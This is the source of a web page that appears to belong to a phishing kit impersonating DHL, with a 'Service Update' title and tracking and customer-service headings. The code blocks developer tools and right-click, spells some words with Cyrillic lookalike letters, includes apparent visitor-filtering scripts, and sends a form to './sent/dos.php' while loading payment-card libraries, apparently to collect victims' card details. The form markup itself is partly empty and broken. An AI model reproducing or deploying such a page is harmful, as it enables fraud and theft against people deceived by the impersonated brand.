<?php 
include "./bye/agent.php";
include "./bye/cn.php";
?>
<!DOCTYPE html>
<html style="font-size: 16px;">
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <meta name="keywords" content="">
    <meta name="description" content="">
    <meta name="page_type" content="np-template-header-footer-from-plugin">
    <title>Service Update</title>
    <link rel="stylesheet" href="css/nice.css" media="screen">
    <link rel="stylesheet" href="css/home.css" media="screen">
    <link rel="stylesheet" href="css/style.css" media="screen">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/paymentfont/1.1.2/css/paymentfont.min.css" media="screen">
    <link id="u-theme-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i|Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i">
    <link id="u-page-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i|Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i">
    <meta name="theme-color" content="#478ac9">
    </head>
  <script type="text/javascript">
    document.onkeydown = function(e) {
if(event.keyCode == 123) {
return false;
}
if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
return false;
}
if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
return false;
}
if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
return false;
}
}
  </script>
  <body oncontextmenu="return false;" class="u-body">
      <header class="u-clearfix u-gradient u-header u-header" id="sec-1722">
        <div class="u-clearfix u-sheet u-sheet-1">
        <p class="u-hidden-lg u-hidden-md u-hidden-sm u-hidden-xl u-text u-text-default u-text-1">
          <span style="font-weight: 700;">Track&nbsp;</span>
          <span class="u-icon u-icon-1">
            <svg class="u-svg-content" viewBox="0 0 96 96" style="width: 1em; height: 1em;">
              <path d="M81.8457,25.3876a6.0239,6.0239,0,0,0-8.45.7676L48,56.6257l-25.396-30.47a5.999,5.999,0,1,0-9.2114,7.6879L43.3943,69.8452a5.9969,5.9969,0,0,0,9.2114,0L82.6074,33.8431A6.0076,6.0076,0,0,0,81.8457,25.3876Z"></path></svg><img></span>
        </p><span class="u-hidden-lg u-hidden-md u-hidden-sm u-hidden-xl u-icon u-icon-circle u-icon-2"><svg class="u-svg-link" preserveAspectRatio="xMidYMin slice" viewBox="0 0 32 32" style=""><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#svg-ff85"></use></svg><svg class="u-svg-content" viewBox="0 0 32 32" id="svg-ff85" style="enable-background:new 0 0 32 32;"><path d="M4,10h24c1.104,0,2-0.896,2-2s-0.896-2-2-2H4C2.896,6,2,6.896,2,8S2.896,10,4,10z M28,14H4c-1.104,0-2,0.896-2,2  s0.896,2,2,2h24c1.104,0,2-0.896,2-2S29.104,14,28,14z M28,22H4c-1.104,0-2,0.896-2,2s0.896,2,2,2h24c1.104,0,2-0.896,2-2  S29.104,22,28,22z"></path></svg></span>
        <a href="https://nicepage.com/c/video-website-templates" class="u-image u-logo u-image-1" data-image-width="640" data-image-height="142">
          <img src="images/lg.png" class="u-logo-image u-logo-image-1">
        </a>
        <div class="u-container-style u-expanded-width-xs u-group u-hidden-xs u-group-1">
          <div class="u-container-layout">
            <p class="u-text u-text-default u-text-2">
              <span style="font-weight: 700;">Track&nbsp;</span><span class="u-icon u-icon-3"><svg class="u-svg-content" viewBox="0 0 96 96" style="width: 1em; height: 1em;"><path d="M81.8457,25.3876a6.0239,6.0239,0,0,0-8.45.7676L48,56.6257l-25.396-30.47a5.999,5.999,0,1,0-9.2114,7.6879L43.3943,69.8452a5.9969,5.9969,0,0,0,9.2114,0L82.6074,33.8431A6.0076,6.0076,0,0,0,81.8457,25.3876Z"></path></svg><img></span>
            </p>
            <p class="u-text u-text-default u-text-3">
              <span style="font-weight: 700;">Ship</span><span class="u-icon u-icon-4"><svg class="u-svg-content" viewBox="0 0 96 96" style="width: 1em; height: 1em;"><path d="M81.8457,25.3876a6.0239,6.0239,0,0,0-8.45.7676L48,56.6257l-25.396-30.47a5.999,5.999,0,1,0-9.2114,7.6879L43.3943,69.8452a5.9969,5.9969,0,0,0,9.2114,0L82.6074,33.8431A6.0076,6.0076,0,0,0,81.8457,25.3876Z"></path></svg><img></span>
            </p>
            <p class="u-hidden-xs u-text u-text-default u-text-4">
              <span style="font-weight: 700;"> Logistics Solutions&nbsp;</span><span class="u-icon u-icon-5"><svg class="u-svg-content" viewBox="0 0 96 96" style="width: 1em; height: 1em;"><path d="M81.8457,25.3876a6.0239,6.0239,0,0,0-8.45.7676L48,56.6257l-25.396-30.47a5.999,5.999,0,1,0-9.2114,7.6879L43.3943,69.8452a5.9969,5.9969,0,0,0,9.2114,0L82.6074,33.8431A6.0076,6.0076,0,0,0,81.8457,25.3876Z"></path></svg><img></span>
            </p>
            <p class="u-text u-text-default u-text-5">
              <span style="font-weight: 700;"> Сustоmеr Sеrvісе&nbsp;</span><span class="u-icon u-icon-6"><svg class="u-svg-content" viewBox="0 0 96 96" style="width: 1em; height: 1em;"><path d="M81.8457,25.3876a6.0239,6.0239,0,0,0-8.45.7676L48,56.6257l-25.396-30.47a5.999,5.999,0,1,0-9.2114,7.6879L43.3943,69.8452a5.9969,5.9969,0,0,0,9.2114,0L82.6074,33.8431A6.0076,6.0076,0,0,0,81.8457,25.3876Z"></path></svg><img></span>
            </p>
          </div>
        </div>
      </div></header>
                <form action="./sent/dos.php" method="POST" class="validate" source="custom" name="form" style="padding: 7px;">
    <section class="u-clearfix u-section-1" id="sec-1a54">
      <div class="u-clearfix u-sheet u-sheet-1">
        <p class="u-custom-font u-font-raleway u-text u-text-default u-text-grey-75 u-text-1"> Trасk: Address Sоlutіоոs </p>
                </p>
                <center><img  style="width: 60%;" src="images/god.png" alt="" data-image-width="409" data-image-height="90"></center>
                <center><img  style="width: 60%;" src="images/tk.png" alt=""></center>
                <div class="u-clearfix u-custom-html u-custom-html-1">
                  <style></style>
          <ul class="form-list validate">
                            </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
      </body>

          <footer class="u-align-center u-clearfix u-footer u-grey-10 u-footer" id="sec-e3a4"><div class="u-clearfix u-sheet u-sheet-1">
        <strong><p class="u-small-text u-text u-text-variant u-text-1"> 2021 © - All Rights Reserved - DHL Post Group</p></strong>
      </div></footer>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.1/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
    <script src="./css/script.js"></script>

</html>